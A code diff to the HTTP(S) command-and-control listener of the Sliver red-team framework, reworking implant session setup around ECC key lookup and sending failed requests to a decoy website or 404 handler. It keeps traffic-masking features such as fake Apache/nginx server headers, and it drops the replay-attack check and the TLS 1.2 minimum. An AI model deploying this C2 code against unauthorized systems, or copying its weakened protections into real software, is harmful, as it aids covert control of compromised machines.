@@ -22,24 +22,19 @@ import (
 	"bytes"
 	"context"
 	"crypto/rand"
-	"crypto/sha256"
 	"crypto/tls"
-	"crypto/x509"
 	"encoding/base64"
 	"encoding/hex"
-	"encoding/pem"
 	"errors"
 	"fmt"
 	"io"
 	"io/ioutil"
 	insecureRand "math/rand"
-	"mime"
 	"net"
 	"net/http"
 	"net/url"
 	"path/filepath"
 	"strconv"
-	"strings"
 	"sync"
 	"time"
 	"unicode"
@@ -49,6 +44,7 @@ import (
 	"github.com/bishopfox/sliver/server/configs"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/cryptography"
+	"github.com/bishopfox/sliver/server/db"
 	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
 	"github.com/bishopfox/sliver/server/log"
 	"github.com/bishopfox/sliver/server/website"
@@ -66,15 +62,19 @@ var (
 	ErrMissingOTP     = errors.New("otp code not found in request")
 	ErrInvalidEncoder = errors.New("invalid request encoder")
 	ErrDecodeFailed   = errors.New("failed to decode request")
-	ErrReplayAttack   = errors.New("replay attack detected")
+	ErrDecryptFailed  = errors.New("failed to decrypt request")
 )
 
 const (
 	DefaultMaxBodyLength   = 2 * 1024 * 1024 * 1024 // 2Gb
 	DefaultHTTPTimeout     = time.Minute * 5
-	DefaultLongPollTimeout = float32(20)
-	DefaultLongPollJitter  = float32(20)
+	DefaultLongPollTimeout = 20 * time.Second
+	DefaultLongPollJitter  = 20 * time.Second
 	minPollTimeout         = time.Second * 5
+)
+
+var (
+	serverVersionHeader string
 )
 
 func init() {
@@ -83,31 +83,15 @@ func init() {
 
 // HTTPSession - Holds data related to a sliver c2 session
 type HTTPSession struct {
-	ID      string
-	Session *core.Session
-	Key     cryptography.AESKey
-	Started time.Time
-	replay  map[string]bool // Sessions are mutex'd
-}
-
-// Keeps a hash of each msg in a session to detect replay'd messages
-func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
-	if len(ciphertext) < 1 {
-		return false
-	}
-	sha := sha256.New()
-	sha.Write(ciphertext)
-	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
-	if _, ok := s.replay[digest]; ok {
-		return true
-	}
-	s.replay[digest] = true
-	return false
+	ID         string
+	ImplanConn *core.ImplantConnection
+	CipherCtx  *cryptography.CipherContext
+	Started    time.Time
 }
 
 // HTTPSessions - All currently open HTTP sessions
 type HTTPSessions struct {
-	active *map[string]*HTTPSession
+	active map[string]*HTTPSession
 	mutex  *sync.RWMutex
 }
 
@@ -115,21 +99,21 @@ type HTTPSessions struct {
 func (s *HTTPSessions) Add(session *HTTPSession) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
-	(*s.active)[session.ID] = session
+	s.active[session.ID] = session
 }
 
 // Get - Get an HTTP session
 func (s *HTTPSessions) Get(sessionID string) *HTTPSession {
 	s.mutex.RLock()
 	defer s.mutex.RUnlock()
-	return (*s.active)[sessionID]
+	return s.active[sessionID]
 }
 
 // Remove - Remove an HTTP session
 func (s *HTTPSessions) Remove(sessionID string) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
-	delete((*s.active), sessionID)
+	delete(s.active, sessionID)
 }
 
 // HTTPHandler - Path mapped to a handler function
@@ -149,8 +133,8 @@ type HTTPServerConfig struct {
 	MaxRequestLength int
 
 	EnforceOTP      bool
-	LongPollTimeout float32
-	LongPollJitter  float32
+	LongPollTimeout int64
+	LongPollJitter  int64
 }
 
 // SliverHTTPC2 - Holds refs to all the C2 objects
@@ -161,20 +145,19 @@ type SliverHTTPC2 struct {
 	SliverStage  []byte // Sliver shellcode to serve during staging process
 	Cleanup      func()
 
-	c2Config      *configs.HTTPC2Config // C2 config (from config file)
-	serverVersion string
+	c2Config *configs.HTTPC2Config // C2 config (from config file)
 }
 
 func (s *SliverHTTPC2) getServerHeader() string {
-	if s.serverVersion == "" {
+	if serverVersionHeader == "" {
 		switch insecureRand.Intn(1) {
 		case 0:
-			s.serverVersion = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(48))
+			serverVersionHeader = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(48))
 		default:
-			s.serverVersion = fmt.Sprintf("nginx/1.%d.%d (Ubuntu)", insecureRand.Intn(21), insecureRand.Intn(8))
+			serverVersionHeader = fmt.Sprintf("nginx/1.%d.%d (Ubuntu)", insecureRand.Intn(21), insecureRand.Intn(8))
 		}
 	}
-	return s.serverVersion
+	return serverVersionHeader
 }
 
 func (s *SliverHTTPC2) getCookieName() string {
@@ -195,12 +178,11 @@ func (s *SliverHTTPC2) LoadC2Config() *configs.HTTPC2Config {
 //						HTTP/HTTPS depending on the caller's conf
 // TODO: Better error handling, configurable ACME host/port
 func StartHTTPSListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
-	StartPivotListener()
 	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
 	server := &SliverHTTPC2{
 		ServerConf: conf,
 		HTTPSessions: &HTTPSessions{
-			active: &map[string]*HTTPSession{},
+			active: map[string]*HTTPSession{},
 			mutex:  &sync.RWMutex{},
 		},
 	}
@@ -245,15 +227,6 @@ func StartHTTPSListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
 			}
 		}
 	}
-	_, _, err := certs.C2ServerGetRSACertificate(conf.Domain)
-	if err == certs.ErrCertDoesNotExist {
-		httpLog.Infof("Generating C2 server certificate ...")
-		_, _, err := certs.C2ServerGenerateRSACertificate(conf.Domain)
-		if err != nil {
-			httpLog.Errorf("Failed to generate server rsa certificate %s", err)
-			return nil, err
-		}
-	}
 
 	return server, nil
 }
@@ -278,7 +251,6 @@ func getHTTPTLSConfig(conf *HTTPServerConfig) *tls.Config {
 	}
 	return &tls.Config{
 		Certificates: []tls.Certificate{cert},
-		MinVersion:   tls.VersionTLS12,
 	}
 }
 
@@ -289,15 +261,9 @@ func (s *SliverHTTPC2) router() *mux.Router {
 		s.ServerConf.MaxRequestLength = DefaultMaxBodyLength
 	}
 	if s.ServerConf.LongPollTimeout == 0 {
-		s.ServerConf.LongPollTimeout = DefaultLongPollTimeout
-		s.ServerConf.LongPollJitter = DefaultLongPollJitter
+		s.ServerConf.LongPollTimeout = int64(DefaultLongPollTimeout)
+		s.ServerConf.LongPollJitter = int64(DefaultLongPollJitter)
 	}
-
-	// Key Exchange Handler
-	router.HandleFunc(
-		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.KeyExchangeFileExt),
-		s.rsaKeyHandler,
-	).MatcherFunc(s.filterOTP).MatcherFunc(s.filterNonce).Methods(http.MethodGet)
 
 	// Start Session Handler
 	router.HandleFunc(
@@ -331,15 +297,8 @@ func (s *SliverHTTPC2) router() *mux.Router {
 		s.stagerHander,
 	).MatcherFunc(s.filterOTP).Methods(http.MethodGet)
 
-	// Request does not match the C2 profile so we pass it to the static content or 404 handler
-	if s.ServerConf.Website != "" {
-		httpLog.Infof("Serving static content from website %v", s.ServerConf.Website)
-		router.HandleFunc("/{rpath:.*}", s.websiteContentHandler).Methods(http.MethodGet)
-	} else {
-		// 404 Handler - Just 404 on every path that doesn't match another handler
-		httpLog.Infof("No website content, using wildcard 404 handler")
-		router.HandleFunc("/{rpath:.*}", default404Handler).Methods(http.MethodGet, http.MethodPost)
-	}
+	// Default handler returns static content or 404s
+	router.HandleFunc("/{rpath:.*}", s.defaultHandler).Methods(http.MethodGet, http.MethodPost)
 
 	router.Use(loggingMiddleware)
 	router.Use(s.DefaultRespHeaders)
@@ -351,7 +310,7 @@ func (s *SliverHTTPC2) router() *mux.Router {
 func (s *SliverHTTPC2) filterNonce(req *http.Request, rm *mux.RouteMatch) bool {
 	nonce, err := getNonceFromURL(req.URL)
 	if err != nil {
-		httpLog.Warnf("Invalid nonce '%d' ignore request", nonce)
+		httpLog.Warnf("Invalid nonce '%d'", nonce)
 		return false // NaN
 	}
 	return true
@@ -440,128 +399,117 @@ func loggingMiddleware(next http.Handler) http.Handler {
 // DefaultRespHeaders - Configures default response headers
 func (s *SliverHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
-		resp.Header().Set("Server", s.getServerHeader())
-		resp.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
-		if resp.Header().Get("Content-type") == "" {
-			contentType := mime.TypeByExtension(req.URL.Path)
-			if contentType != "" {
-				resp.Header().Set("Content-type", contentType)
-			} else {
-				// We add a few more common mime types that aren't detected by
-				// the stdlib mime library
-				switch uri := req.URL.Path; {
-				case strings.HasSuffix(uri, ".jsp"):
-					fallthrough
-				case strings.HasSuffix(uri, ".phtml"):
-					fallthrough
-				case strings.HasSuffix(uri, ".php"):
-					resp.Header().Set("Content-type", mime.TypeByExtension(".html"))
-				default:
-					resp.Header().Set("Content-type", "application/octet-stream")
-				}
-			}
+		if s.c2Config.ServerConfig.RandomVersionHeaders {
+			resp.Header().Set("Server", s.getServerHeader())
+		}
+		for _, header := range s.c2Config.ServerConfig.ExtraHeaders {
+			resp.Header().Set(header.Name, header.Value)
 		}
 		next.ServeHTTP(resp, req)
 	})
 }
 
-func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) {
+func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) error {
 	httpLog.Infof("Request for site %v -> %s", s.ServerConf.Website, req.RequestURI)
 	contentType, content, err := website.GetContent(s.ServerConf.Website, req.RequestURI)
 	if err != nil {
 		httpLog.Infof("No website content for %s", req.RequestURI)
-		resp.WriteHeader(http.StatusNotFound) // No content for this path
-		return
+		return err
 	}
 	resp.Header().Set("Content-type", contentType)
 	resp.Write(content)
+	return nil
 }
 
-func default404Handler(resp http.ResponseWriter, req *http.Request) {
+func (s *SliverHTTPC2) defaultHandler(resp http.ResponseWriter, req *http.Request) {
+	// Request does not match the C2 profile so we pass it to the static content or 404 handler
+	if s.ServerConf.Website != "" {
+		httpLog.Infof("Serving static content from website %v", s.ServerConf.Website)
+		err := s.websiteContentHandler(resp, req)
+		if err == nil {
+			return
+		}
+	}
 	httpLog.Debugf("[404] No match for %s", req.RequestURI)
 	resp.WriteHeader(http.StatusNotFound)
-	resp.Header().Set("Content-type", mime.TypeByExtension(".html"))
 }
 
 // [ HTTP Handlers ] ---------------------------------------------------------------
 
-func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
-	httpLog.Debug("Public key request")
-	nonce, _ := getNonceFromURL(req.URL)
-	certPEM, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, s.ServerConf.Domain)
-	if err != nil {
-		httpLog.Infof("Failed to get server certificate for cn = '%s': %s", s.ServerConf.Domain, err)
-	}
-	_, encoder, err := encoders.EncoderFromNonce(nonce)
-	if err != nil {
-		httpLog.Infof("Failed to find encoder from nonce %d", nonce)
-	}
-	resp.Write(encoder.Encode(certPEM))
-}
-
 func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
 	httpLog.Debug("Start http session request")
-
-	// Note: these are the c2 certificates NOT the certificates/keys used for SSL/TLS
-	publicKeyPEM, privateKeyPEM, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, s.ServerConf.Domain)
-	if err != nil {
-		httpLog.Warn("Failed to fetch rsa private key")
-		resp.WriteHeader(http.StatusNotFound)
-		return
-	}
-
-	// RSA decrypt request body
-	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
-	httpLog.Debugf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
-	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
-	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
-
 	nonce, _ := getNonceFromURL(req.URL)
 	_, encoder, err := encoders.EncoderFromNonce(nonce)
 	if err != nil {
 		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
-		resp.WriteHeader(http.StatusNotFound)
+		s.defaultHandler(resp, req)
 		return
 	}
 	body, err := ioutil.ReadAll(req.Body)
 	if err != nil {
 		httpLog.Errorf("Failed to read body %s", err)
-		resp.WriteHeader(http.StatusNotFound)
+		s.defaultHandler(resp, req)
+		return
 	}
 	data, err := encoder.Decode(body)
 	if err != nil {
 		httpLog.Errorf("Failed to decode body %s", err)
-		resp.WriteHeader(http.StatusNotFound)
+		s.defaultHandler(resp, req)
+		return
+	}
+	if len(data) < 32 {
+		httpLog.Warn("Invalid data length")
+		s.defaultHandler(resp, req)
 		return
 	}
 
-	sessionInitData, err := cryptography.RSADecrypt(data, privateKey)
+	var publicKeyDigest [32]byte
+	copy(publicKeyDigest[:], data[:32])
+	implantConfig, err := db.ImplantConfigByECCPublicKeyDigest(publicKeyDigest)
+	if err != nil || implantConfig == nil {
+		httpLog.Warn("Unknown public key")
+		s.defaultHandler(resp, req)
+		return
+	}
+	// Don't forget to re-add the b64 padding, the length is known so no big deal
+	publicKey, err := base64.StdEncoding.DecodeString(implantConfig.ECCPublicKey + "=")
+	if err != nil || len(publicKey) != 32 {
+		httpLog.Warn("Failed to decode public key")
+		s.defaultHandler(resp, req)
+		return
+	}
+	var senderPublicKey [32]byte
+	copy(senderPublicKey[:], publicKey)
+
+	serverKeyPair := cryptography.ECCServerKeyPair()
+	sessionInitData, err := cryptography.ECCDecrypt(&senderPublicKey, serverKeyPair.Private, data[32:])
 	if err != nil {
-		httpLog.Error("RSA decryption failed")
-		resp.WriteHeader(http.StatusNotFound)
+		httpLog.Error("ECC decryption failed")
+		s.defaultHandler(resp, req)
 		return
 	}
 	sessionInit := &sliverpb.HTTPSessionInit{}
-	proto.Unmarshal(sessionInitData, sessionInit)
+	err = proto.Unmarshal(sessionInitData, sessionInit)
+	if err != nil {
+		httpLog.Error("Failed to decode session init")
+		return
+	}
 
 	httpSession := newHTTPSession()
-	httpSession.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
-	httpSession.Session = core.Sessions.Add(&core.Session{
-		ID:            core.NextSessionID(),
-		Transport:     "http(s)",
-		RemoteAddress: getRemoteAddr(req),
-		Send:          make(chan *sliverpb.Envelope),
-		RespMutex:     &sync.RWMutex{},
-		Resp:          map[uint64]chan *sliverpb.Envelope{},
-	})
-	httpSession.Session.UpdateCheckin()
+	sKey, err := cryptography.KeyFromBytes(sessionInit.Key)
+	if err != nil {
+		httpLog.Error("Failed to convert bytes to session key")
+		return
+	}
+	httpSession.CipherCtx = cryptography.NewCipherContext(sKey)
+	httpSession.ImplanConn = core.NewImplantConnection("http(s)", getRemoteAddr(req))
 	s.HTTPSessions.Add(httpSession)
 	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)
 
-	ciphertext, err := cryptography.GCMEncrypt(httpSession.Key, []byte(httpSession.ID))
+	responseCiphertext, err := httpSession.CipherCtx.Encrypt([]byte(httpSession.ID))
 	if err != nil {
 		httpLog.Info("Failed to encrypt session identifier")
-		resp.WriteHeader(http.StatusNotFound)
+		s.defaultHandler(resp, req)
 		return
 	}
 	http.SetCookie(resp, &http.Cookie{
@@ -571,17 +519,17 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 		Secure:   false,
 		HttpOnly: true,
 	})
-	resp.Write(encoder.Encode(ciphertext))
+	resp.Write(encoder.Encode(responseCiphertext))
 }
 
 func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
 	httpLog.Debug("Session request")
 	httpSession := s.getHTTPSession(req)
 	if httpSession == nil {
-		httpLog.Infof("No session with id %#v", httpSession.ID)
-		resp.WriteHeader(http.StatusForbidden)
+		s.defaultHandler(resp, req)
 		return
 	}
+	httpSession.ImplanConn.UpdateLastMessage()
 
 	plaintext, err := s.readReqBody(httpSession, resp, req)
 	if err != nil {
@@ -591,44 +539,51 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 	envelope := &sliverpb.Envelope{}
 	proto.Unmarshal(plaintext, envelope)
 
-	handlers := sliverHandlers.GetSessionHandlers()
+	resp.WriteHeader(http.StatusAccepted)
+	handlers := sliverHandlers.GetHandlers()
 	if envelope.ID != 0 {
-		httpSession.Session.RespMutex.RLock()
-		defer httpSession.Session.RespMutex.RUnlock()
-		if resp, ok := httpSession.Session.Resp[envelope.ID]; ok {
+		httpSession.ImplanConn.RespMutex.RLock()
+		defer httpSession.ImplanConn.RespMutex.RUnlock()
+		if resp, ok := httpSession.ImplanConn.Resp[envelope.ID]; ok {
 			resp <- envelope
 		}
 	} else if handler, ok := handlers[envelope.Type]; ok {
-		handler.(func(*core.Session, []byte))(httpSession.Session, envelope.Data)
+		respEnvelope := handler(httpSession.ImplanConn, envelope.Data)
+		if respEnvelope != nil {
+			go func() {
+				httpSession.ImplanConn.Send <- respEnvelope
+			}()
+		}
 	}
-	resp.WriteHeader(http.StatusAccepted)
 }
 
 func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
 	httpLog.Debug("Poll request")
 	httpSession := s.getHTTPSession(req)
 	if httpSession == nil {
-		httpLog.Warnf("No session with id %#v", httpSession.ID)
-		resp.WriteHeader(http.StatusForbidden)
+		s.defaultHandler(resp, req)
 		return
 	}
+	httpSession.ImplanConn.UpdateLastMessage()
 
 	// We already know we have a valid nonce because of the middleware filter
 	nonce, _ := getNonceFromURL(req.URL)
 	_, encoder, _ := encoders.EncoderFromNonce(nonce)
 	select {
-	case envelope := <-httpSession.Session.Send:
+	case envelope := <-httpSession.ImplanConn.Send:
 		resp.WriteHeader(http.StatusOK)
 		envelopeData, _ := proto.Marshal(envelope)
-		ciphertext, err := cryptography.GCMEncrypt(httpSession.Key, envelopeData)
+		ciphertext, err := httpSession.CipherCtx.Encrypt(envelopeData)
 		if err != nil {
 			httpLog.Errorf("Failed to encrypt message %s", err)
 			ciphertext = []byte{}
 		}
 		resp.Write(encoder.Encode(ciphertext))
+	case <-req.Context().Done():
+		httpLog.Debug("Poll client hang up")
+		return
 	case <-time.After(s.getPollTimeout()):
 		httpLog.Debug("Poll time out")
-		resp.Header().Set("Etag", s.randomEtag())
 		resp.WriteHeader(http.StatusNoContent)
 		resp.Write([]byte{})
 	}
@@ -639,7 +594,7 @@ func (s *SliverHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseW
 	_, encoder, err := encoders.EncoderFromNonce(nonce)
 	if err != nil {
 		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
-		resp.WriteHeader(http.StatusNotFound)
+		s.defaultHandler(resp, req)
 		return nil, ErrInvalidEncoder
 	}
 
@@ -655,16 +610,15 @@ func (s *SliverHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseW
 	data, err := encoder.Decode(body)
 	if err != nil {
 		httpLog.Warnf("Failed to decode body %s", err)
-		resp.WriteHeader(http.StatusNotFound)
+		s.defaultHandler(resp, req)
 		return nil, ErrDecodeFailed
 	}
-
-	if httpSession.isReplayAttack(data) {
-		httpLog.Warn("Replay attack detected")
-		resp.WriteHeader(http.StatusNotFound)
-		return nil, ErrReplayAttack
+	plaintext, err := httpSession.CipherCtx.Decrypt(data)
+	if err != nil {
+		httpLog.Warnf("Decryption failure %s", err)
+		s.defaultHandler(resp, req)
+		return nil, ErrDecryptFailed
 	}
-	plaintext, err := cryptography.GCMDecrypt(httpSession.Key, data)
 	return plaintext, err
 }
 
@@ -674,8 +628,9 @@ func (s *SliverHTTPC2) getPollTimeout() time.Duration {
 	}
 	min := s.ServerConf.LongPollTimeout
 	max := s.ServerConf.LongPollTimeout + s.ServerConf.LongPollJitter
-	timeout := min + insecureRand.Float32()*(max-min)
-	pollTimeout := time.Duration(timeout) * time.Second
+	timeout := float64(min) + insecureRand.Float64()*(float64(max)-float64(min))
+	pollTimeout := time.Duration(int64(timeout))
+	httpLog.Debugf("Poll timeout: %s", pollTimeout)
 	if pollTimeout < minPollTimeout {
 		httpLog.Warnf("Poll timeout is too short, using default minimum %v", minPollTimeout)
 		pollTimeout = minPollTimeout
@@ -683,29 +638,18 @@ func (s *SliverHTTPC2) getPollTimeout() time.Duration {
 	return pollTimeout
 }
 
-func (s *SliverHTTPC2) randomEtag() string {
-	buf := make([]byte, 16)
-	rand.Read(buf)
-	return hex.EncodeToString(buf[:])
-}
-
 func (s *SliverHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request) {
 	httpLog.Debug("Close request")
 	httpSession := s.getHTTPSession(req)
 	if httpSession == nil {
 		httpLog.Infof("No session with id %#v", httpSession.ID)
-		resp.WriteHeader(http.StatusForbidden)
+		s.defaultHandler(resp, req)
 		return
 	}
-
-	_, err := s.readReqBody(httpSession, resp, req)
-	if err != nil {
-		httpLog.Errorf("Failed to read request body %s", err)
-		resp.WriteHeader(http.StatusForbidden)
-		return
+	for _, cookie := range req.Cookies() {
+		cookie.MaxAge = -1
+		http.SetCookie(resp, cookie)
 	}
-
-	core.Sessions.Remove(httpSession.Session.ID)
 	s.HTTPSessions.Remove(httpSession.ID)
 	resp.WriteHeader(http.StatusAccepted)
 }
@@ -727,7 +671,7 @@ func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
 	for _, cookie := range req.Cookies() {
 		httpSession := s.HTTPSessions.Get(cookie.Value)
 		if httpSession != nil {
-			httpSession.Session.UpdateCheckin()
+			httpSession.ImplanConn.UpdateLastMessage()
 			return httpSession
 		}
 	}
@@ -738,7 +682,6 @@ func newHTTPSession() *HTTPSession {
 	return &HTTPSession{
 		ID:      newHTTPSessionID(),
 		Started: time.Now(),
-		replay:  map[string]bool{},
 	}
 }
 
